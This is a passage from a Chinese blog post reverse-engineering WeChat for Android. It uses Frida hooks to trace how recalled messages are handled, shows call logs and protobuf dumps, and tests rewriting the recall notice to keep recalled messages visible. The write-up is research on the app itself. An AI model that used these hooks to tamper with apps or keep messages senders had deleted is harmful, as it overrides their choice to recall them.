class="string">&#x27;com.tencent.mm.s.b&#x27;</span>);</span><br><span class="line">    clazz.b.overload(<span class="string">&#x27;com.tencent.mm.ak.e$a&#x27;</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> log_str = <span class="string">&quot;arguments:&quot;</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="built_in">arguments</span>.length; i++) &#123;</span><br><span class="line">            log_str += <span class="string">&quot; [&quot;</span> + i + <span class="string">&quot;]&quot;</span> + <span class="built_in">arguments</span>[i]</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;5 b.b()&quot;</span>, log_str);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> clazz.b.overload(<span class="string">&#x27;com.tencent.mm.ak.e$a&#x27;</span>).apply(<span class="built_in">this</span>, <span class="built_in">arguments</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> clazz = Java.use(<span class="string">&#x27;com.tencent.mm.plugin.messenger.foundation.c&#x27;</span>);</span><br><span class="line">    clazz.processAddMsg.implementation = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> log_str = <span class="string">&quot;arguments:&quot;</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="built_in">arguments</span>.length; i++) &#123;</span><br><span class="line">            log_str += <span class="string">&quot; [&quot;</span> + i + <span class="string">&quot;]&quot;</span> + <span class="built_in">arguments</span>[i]</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;4 c.processAddMsg()&quot;</span>, log_str);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> clazz.processAddMsg.apply(<span class="built_in">this</span>, <span class="built_in">arguments</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> clazz = Java.use(<span class="string">&#x27;com.tencent.mm.plugin.messenger.foundation.c&#x27;</span>);</span><br><span class="line">    clazz.a.implementation = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> log_str = <span class="string">&quot;arguments:&quot;</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="built_in">arguments</span>.length; i++) &#123;</span><br><span class="line">            log_str += <span class="string">&quot; [&quot;</span> + i + <span class="string">&quot;]&quot;</span> + <span class="built_in">arguments</span>[i]</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;3 c.a()&quot;</span>, log_str);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> clazz.a.apply(<span class="built_in">this</span>, <span class="built_in">arguments</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> clazz = Java.use(<span class="string">&#x27;com.tencent.mm.plugin.messenger.foundation.f&#x27;</span>);</span><br><span class="line">    clazz.a.implementation = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> log_str = <span class="string">&quot;arguments:&quot;</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="built_in">arguments</span>.length; i++) &#123;</span><br><span class="line">            log_str += <span class="string">&quot; [&quot;</span> + i + <span class="string">&quot;]&quot;</span> + <span class="built_in">arguments</span>[i]</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;2 f.a()&quot;</span>, log_str);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> clazz.a.apply(<span class="built_in">this</span>, <span class="built_in">arguments</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> clazz = Java.use(<span class="string">&#x27;com.tencent.mm.plugin.zero.c&#x27;</span>);</span><br><span class="line">    clazz.a.implementation = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> log_str = <span class="string">&quot;arguments:&quot;</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="built_in">arguments</span>.length; i++) &#123;</span><br><span class="line">            log_str += <span class="string">&quot; [&quot;</span> + i + <span class="string">&quot;]&quot;</span> + <span class="built_in">arguments</span>[i]</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;1 c.a()&quot;</span>, log_str);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> clazz.a.apply(<span class="built_in">this</span>, <span class="built_in">arguments</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>对方发送一条消息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 c.a() arguments: [0]com.tencent.mm.protocal.protobuf.aaf@84db3f8 [1]false</span><br><span class="line">2 f.a() arguments: [0]com.tencent.mm.protocal.protobuf.aaf@84db3f8 [1][object Object] [2]false</span><br><span class="line">3 c.a() arguments: [0]com.tencent.mm.protocal.protobuf.aaf@84db3f8 [1][object Object] [2]false [3][object Object]</span><br><span class="line">4 c.processAddMsg() arguments: [0]AddMsgInfo(263938257), get[false], fault[false], up[false] fixTime[0] [1][object Object]</span><br></pre></td></tr></table></figure>
<p>对方撤回该消息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 c.a() arguments: [0]com.tencent.mm.protocal.protobuf.aaf@d4208e1 [1]false</span><br><span class="line">2 f.a() arguments: [0]com.tencent.mm.protocal.protobuf.aaf@d4208e1 [1][object Object] [2]false</span><br><span class="line">3 c.a() arguments: [0]com.tencent.mm.protocal.protobuf.aaf@d4208e1 [1][object Object] [2]false [3][object Object]</span><br><span class="line">4 c.processAddMsg() arguments: [0]AddMsgInfo(47744518), get[false], fault[false], up[false] fixTime[0] [1][object Object]</span><br><span class="line">5 b.b() arguments: [0]AddMsgInfo(47744518), get[false], fault[false], up[false] fixTime[0]</span><br><span class="line">6 ch.b() arguments: [0]AddMsgInfo(47744518), get[false], fault[false], up[false] fixTime[0]</span><br><span class="line">7 f.a() arguments: [0]revokemsg [1][object Object] [2]AddMsgInfo(47744518), get[false], fault[false], up[false] fixTime[0]</span><br><span class="line">8 handleRevokeMsgBySvrId arguments: [0]796494781522958800</span><br></pre></td></tr></table></figure>
<h4 id="4-c-processAddMsg">4 c.processAddMsg()<a class="header-anchor" href="#4-c-processAddMsg"> ¶ </a></h4>
<p>发现是从<code>processAddMsg()</code>方法开始不一样的，也就是最先在这里判断是否为撤回消息的</p>
<p>而判断是否进入第五层的消息是靠<code>v2!=null</code>来判断的，而v2来自<code>v3.vkP</code>，v3来自参数一<code>arg10.gpg</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//image-20210816201709925.png" alt="image-20210816201709925"></p>
<p>经调试，普通文本消息的<code>v3.vkP</code>为<code>1</code>，而撤回消息的<code>v3.vkP</code>为<code>10002</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//image-20210816210123382.png" alt="image-20210816210123382"></p>
<p>而这恰好有个<code>10002</code>，不过并没有详细分析这里</p>
<h4 id="5-b-b">5 b.b()<a class="header-anchor" href="#5-b-b"> ¶ </a></h4>
<p>进入调用的<code>b(arg10)</code>方法，也就是<code>com.tencent.mm.s.b.b()</code>没发现啥东西</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//image-20210816210228078.png" alt="image-20210816210228078"></p>
<p><strong>因为正常消息不会执行这个方法，当直接将该方法替换为空的时候，已经可以实现防撤回</strong>😂暴力yyds，但是没有撤回提示，还得继续分析</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//Image-20210816211759.jpg" alt="Image-20210816211759"></p>
<h4 id="6-ch-b">6 ch.b()<a class="header-anchor" href="#6-ch-b"> ¶ </a></h4>
<p>直接进入下一层<code>com.tencent.mm.model.ch.b</code>方法，在一开始又对<code>.vkP</code>做了一次判断</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//image-20210816210702683.png" alt="image-20210816210702683"></p>
<p>至于<code>10001</code>暂不知作用。对于<code>10001</code>只有那一点处理，之后就<code>return null</code>了；而default分支最后也是<code>return null</code>，可以得知<code>.vkp</code>的含义是<code>msgType</code></p>
<p>可以知道这一个函数都是对撤回消息也就是<code>msgType==10002</code>进行处理的</p>
<p>然后该方法下面都是对v5的判断逻辑，而<code>v5=v0.GYI.IYz</code></p>
<p>将<code>v0.GYI</code>json化输出，得到</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="comment">// com.tencent.mm.protocal.protobuf.cv</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;CreateTime&quot;</span>: <span class="number">1629120000</span>,</span><br><span class="line">    <span class="attr">&quot;GYG&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;IYA&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">        <span class="attr">&quot;IYz&quot;</span>: <span class="string">&quot;wxid_00000000000000&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;includeUnKnownField&quot;</span>: <span class="literal">false</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;GYH&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;IYA&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">        <span class="attr">&quot;IYz&quot;</span>: <span class="string">&quot;wxid_00000000000000&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;includeUnKnownField&quot;</span>: <span class="literal">false</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;GYI&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;IYA&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">        <span class="attr">&quot;IYz&quot;</span>: <span class="string">&quot;\u003csysmsg type\u003d\&quot;revokemsg\&quot;\u003e\n\t\u003crevokemsg\u003e\n\t\t\u003csession\u003ewxid_00000000000000\u003c/session\u003e\n\t\t\u003cmsgid\u003e1070000000\u003c/msgid\u003e\n\t\t\u003cnewmsgid\u003e600000000000000\u003c/newmsgid\u003e\n\t\t\u003creplacemsg\u003e\u003c![CDATA[\&quot;Forgo7ten.\&quot; 撤回了一条消息]]\u003e\u003c/replacemsg\u003e\n\t\u003c/revokemsg\u003e\n\u003c/sysmsg\u003e\n&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;includeUnKnownField&quot;</span>: <span class="literal">false</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;GYJ&quot;</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="attr">&quot;GYK&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;hasBuffer&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="attr">&quot;hasILen&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">        <span class="attr">&quot;iLen&quot;</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="attr">&quot;includeUnKnownField&quot;</span>: <span class="literal">false</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;GYN&quot;</span>: <span class="number">656800000</span>,</span><br><span class="line">    <span class="attr">&quot;nNf&quot;</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="attr">&quot;vkP&quot;</span>: <span class="number">10002</span>,</span><br><span class="line">    <span class="attr">&quot;ysP&quot;</span>: <span class="number">1073900000</span>,</span><br><span class="line">    <span class="attr">&quot;ysR&quot;</span>: <span class="number">2498250000000000000</span>,</span><br><span class="line">    <span class="attr">&quot;data&quot;</span>: [<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>],      <span class="comment">// 这些消息的字节数据</span></span><br><span class="line">    <span class="attr">&quot;includeUnKnownField&quot;</span>: <span class="literal">false</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>而v5也就是</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">sysmsg</span> <span class="attr">type</span>=<span class="string">&quot;revokemsg&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">revokemsg</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">session</span>&gt;</span>wxid_##############<span class="tag">&lt;/<span class="name">session</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">msgid</span>&gt;</span>10739#####<span class="tag">&lt;/<span class="name">msgid</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">newmsgid</span>&gt;</span>7829338############<span class="tag">&lt;/<span class="name">newmsgid</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">replacemsg</span>&gt;</span>&lt;![CDATA[&quot;Forgo7ten.&quot; 撤回了一条消息]]&gt;<span class="tag">&lt;/<span class="name">replacemsg</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">revokemsg</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">sysmsg</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>尝试一下修改信息</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">modify_revoke_str</span>(<span class="params">old_revoke_str</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> message = <span class="string">&quot;尝试撤回了一条消息&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> revoke_msg = Java.use(<span class="string">&quot;java.lang.String&quot;</span>).$new(message);</span><br><span class="line">    <span class="keyword">var</span> sub_str = Java.use(<span class="string">&quot;java.lang.String&quot;</span>).$new(<span class="string">&quot;]]&gt;&lt;/replacemsg&gt;&quot;</span>)</span><br><span class="line">    <span class="keyword">var</span> index = old_revoke_str.indexOf(sub_str);</span><br><span class="line">    <span class="keyword">var</span> new_revoke_str = old_revoke_str.substring(<span class="number">0</span>, index - <span class="number">7</span>) + revoke_msg + old_revoke_str.substring(index);</span><br><span class="line">    <span class="keyword">return</span> Java.use(<span class="string">&quot;java.lang.String&quot;</span>).$new(new_revoke_str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    Java.openClassFile(<span class="string">&quot;/data/local/tmp/r0gson.dex&quot;</span>).load();</span><br><span class="line">    <span class="keyword">const</span> gson = Java.use(<span class="string">&#x27;com.r0ysue.gson.Gson&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> clazz = Java.use(<span class="string">&#x27;com.tencent.mm.model.ch&#x27;</span>);</span><br><span class="line">    clazz.b.overload(<span class="string">&#x27;com.tencent.mm.ak.e$a&#x27;</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> log_str = <span class="string">&quot;arguments:&quot;</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="built_in">arguments</span>.length; i++) &#123;</span><br><span class="line">            log_str += <span class="string">&quot; [&quot;</span> + i + <span class="string">&quot;]&quot;</span> + <span class="built_in">arguments</span>[i]</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;====================&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> v0 = Java.cast(<span class="built_in">arguments</span>[<span class="number">0</span>].gpg.value, Java.use(<span class="string">&quot;com.tencent.mm.protocal.protobuf.cv&quot;</span>));</span><br><span class="line">        <span class="built_in">console</span>.log(gson.$new().toJson(v0));</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">modify_revoke_str</span>(<span class="params">old_revoke_str</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> message = <span class="string">&quot;尝试撤回了一条消息&quot;</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">var</span> revoke_msg = Java.use(<span class="string">&quot;java.lang.String&quot;</span>).$new(message);</span><br><span class="line">            <span class="keyword">var</span> sub_str = Java.use(<span class="string">&quot;java.lang.String&quot;</span>).$new(<span class="string">&quot;]]&gt;&lt;/replacemsg&gt;&quot;</span>)</span><br><span class="line">            <span class="keyword">var</span> index = old_revoke_str.indexOf(sub_str);</span><br><span class="line">            <span class="keyword">var</span> new_revoke_str = old_revoke_str.substring(<span class="number">0</span>, index - <span class="number">7</span>) + revoke_msg + old_revoke_str.substring(index);</span><br><span class="line">            <span class="keyword">return</span> Java.use(<span class="string">&quot;java.lang.String&quot;</span>).$new(new_revoke_str);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> revoke_xml_obj = Java.cast(v0.GYI.value, Java.use(<span class="string">&quot;com.tencent.mm.protocal.protobuf.deo&quot;</span>));</span><br><span class="line"></span><br><span class="line">        revoke_xml_obj.IYz.value = modify_revoke_str(revoke_xml_obj.IYz.value);</span><br><span class="line">        <span class="built_in">console</span>.log(revoke_xml_obj.IYz.value);</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;====================&quot;</span>);</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;6 ch.b()&quot;</span>, log_str);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> clazz.b.overload(<span class="string">&#x27;com.tencent.mm.ak.e$a&#x27;</span>).apply(<span class="built_in">this</span>, <span class="built_in">arguments</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>虽然消息还是被撤回了，但也说明这种修改提示信息的方式是可行的</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//img-1629127911174.png" alt="img"></p>
<p>通过hook<code>notifyDataSetChanged</code>，json打印最后一条消息发现</p>
<p>撤回消息与撤回提示，仅有<code>field_content&quot;</code>（文本内容）、<code>&quot;field_type&quot;</code>、<code>&quot;exe&quot;</code>字段不一样</p>
<p>其中正常消息的<code>field_type=1,exe=true</code>；撤回提示<code>field_type=10000,exe=false</code></p>
<p>被撤回消息和撤回消息的提示的<code>field_msgSvrId</code>字段是一样的，同时对应着撤回提示xml的<code>&lt;newmsgid&gt;</code>字段</p>
<p>尝试修改撤回提示的<code>&lt;newmsgid&gt;</code>字段，发现没有什么用。直接就变成不撤回了。</p>
<h5 id="返回该函数的分析">返回该函数的分析<a class="header-anchor" href="#返回该函数的分析"> ¶ </a></h5>
<p>大概是对xml进行分析处理的一些东西</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//image-20210816235316259.png" alt="image-20210816235316259"></p>
<p>之后就去了<code>com.tencent.mm.model.f.a()</code>方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> com.tencent.mm.ak.e.<span class="function">b <span class="title">a</span><span class="params">(String arg24, Map arg25, com.tencent.mm.ak.e.a arg26)</span></span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>
<p>参数一为字符串String，获取过程为上图中蓝框</p>
<ul>
<li>即获取的是xml中<code>sysmsg</code>的<code>type</code>属性</li>
<li>撤回消息就为<code>&quot;revokemsg&quot;</code></li>
</ul>
</li>
<li>
<p>参数二是一个XML内容转成的Map数组</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;.sysmsg.revokemsg.newmsgid&quot;</span>: <span class="string">&quot;4308###############&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;.sysmsg.revokemsg&quot;</span>: <span class="string">&quot;\n\t&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;.sysmsg.revokemsg.session&quot;</span>: <span class="string">&quot;wxid_##############&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;.sysmsg&quot;</span>: <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;.sysmsg.$type&quot;</span>: <span class="string">&quot;revokemsg&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;.sysmsg.revokemsg.replacemsg&quot;</span>: <span class="string">&quot;\&quot;Forgo7ten.\&quot; 撤回了一条消息&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;.sysmsg.revokemsg.msgid&quot;</span>: <span class="string">&quot;##########&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>参数三保存着原始的所有数据</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// com.tencent.mm.ak.e$a</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;gpg&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;CreateTime&quot;</span>: <span class="number">1629120000</span>,</span><br><span class="line">        <span class="string">&quot;GYG&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;IYA&quot;</span>: <span class="keyword">true</span>,</span><br><span class="line">            <span class="string">&quot;IYz&quot;</span>: <span class="string">&quot;wxid_00000000000000&quot;</span>,</span><br><span class="line">            <span class="string">&quot;includeUnKnownField&quot;</span>: <span class="keyword">false</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;GYH&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;IYA&quot;</span>: <span class="keyword">true</span>,</span><br><span class="line">            <span class="string">&quot;IYz&quot;</span>: <span class="string">&quot;wxid_00000000000000&quot;</span>,</span><br><span class="line">            <span class="string">&quot;includeUnKnownField&quot;</span>: <span class="keyword">false</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;GYI&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;IYA&quot;</span>: <span class="keyword">true</span>,</span><br><span class="line">            <span class="string">&quot;IYz&quot;</span>: <span class="string">&quot;\u003csysmsg type\u003d\&quot;revokemsg\&quot;\u003e\n\t\u003crevokemsg\u003e\n\t\t\u003csession\u003ewxid_00000000000000\u003c/session\u003e\n\t\t\u003cmsgid\u003e1070000000\u003c/msgid\u003e\n\t\t\u003cnewmsgid\u003e600000000000000\u003c/newmsgid\u003e\n\t\t\u003creplacemsg\u003e\u003c![CDATA[\&quot;Forgo7ten.\&quot; 撤回了一条消息]]\u003e\u003c/replacemsg\u003e\n\t\u003c/revokemsg\u003e\n\u003c/sysmsg\u003e\n&quot;</span>,</span><br><span class="line">            <span class="string">&quot;includeUnKnownField&quot;</span>: <span class="keyword">false</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;GYJ&quot;</span>: <span class="number">1</span>,</span><br><span class="line">        <span class="string">&quot;GYK&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;hasBuffer&quot;</span>: <span class="keyword">false</span>,</span><br><span class="line">            <span class="string">&quot;hasILen&quot;</span>: <span class="keyword">true</span>,</span><br><span class="line">            <span class="string">&quot;iLen&quot;</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="string">&quot;includeUnKnownField&quot;</span>: <span class="keyword">false</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;GYN&quot;</span>: <span class="number">656800000</span>,</span><br><span class="line">        <span class="string">&quot;nNf&quot;</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="string">&quot;vkP&quot;</span>: <span class="number">10002</span>,</span><br><span class="line">        <span class="string">&quot;ysP&quot;</span>: <span class="number">1073900000</span>,</span><br><span class="line">        <span class="string">&quot;ysR&quot;</span>: <span class="number">2498250000000000000</span>,</span><br><span class="line">        <span class="string">&quot;data&quot;</span>: [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>], <span class="comment">// 这些消息的字节数据</span></span><br><span class="line">        <span class="string">&quot;includeUnKnownField&quot;</span>: <span class="keyword">false</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;hQb&quot;</span>: <span class="keyword">false</span>,</span><br><span class="line">    <span class="string">&quot;hQc&quot;</span>: <span class="keyword">false</span>,</span><br><span class="line">    <span class="string">&quot;hQd&quot;</span>: <span class="keyword">false</span>,</span><br><span class="line">    <span class="string">&quot;hQe&quot;</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="string">&quot;hQf&quot;</span>: <span class="keyword">false</span>,</span><br><span class="line">    <span class="string">&quot;what&quot;</span>: <span class="number">0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="7-f-a">7 f.a()<a class="header-anchor" href="#7-f-a"> ¶ </a></h4>
<p>这个方法里面是分块对参数一也就是<code>.sysmsg.$type</code>的值进行判断</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//image-20210817135838492.png" alt="image-20210817135838492"></p>
<p>之后发现将<code>.a()</code>方法置为空则消息不会撤回，继续跟入</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//image-20210817140049459.png" alt="image-20210817140049459"></p>
<p>在里面发现了数据库操作方法update</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//image-20210817140125502.png" alt="image-20210817140125502"></p>
<p>之后嵌套了三个update，最后来到了<code>updateWithOnConflict</code>方法</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//image-20210817142313024.png" alt="image-20210817142313024"></p>
<p>附上堆栈信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">=============================updateWithOnConflict Stack strat=======================</span><br><span class="line">com.tencent.wcdb.database.SQLiteDatabase.updateWithOnConflict(Native Method)</span><br><span class="line">com.tencent.wcdb.database.SQLiteDatabase.update(SourceFile:1726)</span><br><span class="line">com.tencent.mm.storagebase.f.update(SourceFile:895)</span><br><span class="line">com.tencent.mm.storagebase.h.update(SourceFile:601)</span><br><span class="line">com.tencent.mm.storage.ca.a(SourceFile:2426)</span><br><span class="line">com.tencent.mm.storage.ca.a(Native Method)</span><br><span class="line">com.tencent.mm.model.f.a(SourceFile:2187)</span><br><span class="line">com.tencent.mm.model.f.a(Native Method)</span><br><span class="line">com.tencent.mm.model.ch.b(SourceFile:258)</span><br><span class="line">com.tencent.mm.model.ch.b(Native Method)</span><br><span class="line">com.tencent.mm.s.b.b(SourceFile:40)</span><br><span class="line">com.tencent.mm.s.b.b(Native Method)</span><br><span class="line">com.tencent.mm.plugin.messenger.foundation.c.processAddMsg(SourceFile:165)</span><br><span class="line">com.tencent.mm.plugin.messenger.foundation.c.processAddMsg(Native Method)</span><br><span class="line">com.tencent.mm.plugin.messenger.foundation.c.a(SourceFile:1059)</span><br><span class="line">com.tencent.mm.plugin.messenger.foundation.c.a(Native Method)</span><br><span class="line">com.tencent.mm.plugin.messenger.foundation.f.a(SourceFile:118)</span><br><span class="line">com.tencent.mm.plugin.messenger.foundation.f.a(Native Method)</span><br><span class="line">com.tencent.mm.plugin.zero.c.a(SourceFile:57)</span><br><span class="line">com.tencent.mm.plugin.zero.c.a(Native Method)</span><br><span class="line">com.tencent.mm.modelmulti.q$a$1.onTimerExpired(SourceFile:830)</span><br><span class="line">com.tencent.mm.sdk.platformtools.aw.handleMessage(SourceFile:86)</span><br><span class="line">com.tencent.mm.sdk.platformtools.aq$2.handleMessage(SourceFile:362)</span><br><span class="line">android.os.Handler.dispatchMessage(Handler.java:106)</span><br><span class="line">com.tencent.mm.sdk.platformtools.aq$2.dispatchMessage(SourceFile:350)</span><br><span class="line">android.os.Looper.loop(Looper.java:164)</span><br><span class="line">android.os.HandlerThread.run(HandlerThread.java:65)</span><br><span class="line">=============================updateWithOnConflict Stack end=======================</span><br></pre></td></tr></table></figure>
<p>经过一系列分析之后……（其实上面肯定都有分析的，只不过是很杂乱无从记录，这块就简写了</p>
